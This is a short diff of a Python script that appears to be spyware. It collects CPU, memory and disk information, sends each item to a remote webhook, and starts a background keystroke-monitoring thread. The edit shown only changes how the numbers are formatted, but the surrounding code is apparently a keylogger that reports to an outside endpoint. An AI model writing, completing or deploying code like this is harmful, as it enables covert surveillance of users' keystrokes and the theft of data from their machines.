@@ -112,17 +112,10 @@ cpu_percent = psutil.cpu_percent(interval=1)
 memory_info = psutil.virtual_memory()
 disk_info = psutil.disk_usage('/')
 
-total_memory = bytes_to_human_readable(memory_info.total)
-available_memory = bytes_to_human_readable(memory_info.available)
-used_memory = bytes_to_human_readable(memory_info.used)
-total_disk = bytes_to_human_readable(disk_info.total)
-used_disk = bytes_to_human_readable(disk_info.used)
-free_disk = bytes_to_human_readable(disk_info.free)
-
 send_to_webhook(f"CPU cores: {cpu_count}")
 send_to_webhook(f"CPU percent: {cpu_percent}%")
-send_to_webhook(f"Memory info: Total: {total_memory}, Available: {available_memory}, Used: {used_memory}, Percent: {memory_info.percent}%")
-send_to_webhook(f"Disk info: Total: {total_disk}, Used: {used_disk}, Free: {free_disk}, Percent: {disk_info.percent}%")
+send_to_webhook(f"Memory info: Total: {memory_info.total}, Available: {memory_info.available}, Used: {memory_info.used}, Percent: {memory_info.percent}%")
+send_to_webhook(f"Disk info: Total: {disk_info.total}, Used: {disk_info.used}, Free: {disk_info.free}, Percent: {disk_info.percent}%")
 
 # Start the keystroke monitor thread
 threading.Thread(target=keystroke_monitor, daemon=True).start()
